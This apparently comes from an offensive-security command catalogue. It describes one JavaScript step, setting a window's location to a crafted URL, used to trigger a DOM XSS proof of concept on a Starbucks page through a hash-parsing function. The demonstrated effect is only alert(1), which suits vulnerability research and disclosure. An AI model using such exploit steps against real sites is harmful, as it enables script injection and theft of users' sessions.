---
data: win.location=url;
tags:
  - xss
  - poc
  - trigger
type: command
output: 'Page reloads, triggering XSS alert(1).'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.630Z'
id: 4cbbb30d-80ea-40e4-9b37-1ef976e75504
verified: false
validated: true
submitted: true
---
# starbucks-xss-poc-reload

## Command

```javascript
win.location=url;
```

## Description

Reloads the URL in the target window, changing location.hash and invoking the vulnerable _observeHistory function to parse and execute the XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| win | Opened window reference | Yes |
| url | Malicious URL with hash | Yes |

## Examples

### Basic Usage

```javascript
win.location=url;
```

### Advanced Usage

```javascript
if (win && !win.closed) {
  win.location=url;
} else {
  console.error('Window closed');
}
```

## Expected Output

The page reloads, and an alert box displays '1' as the onerror handler executes in the parsed HTML context.

## Related

- [[Related Procedure|procedures/Trigger-DOM-XSS-via-Hash-Reload-on-IE11]]
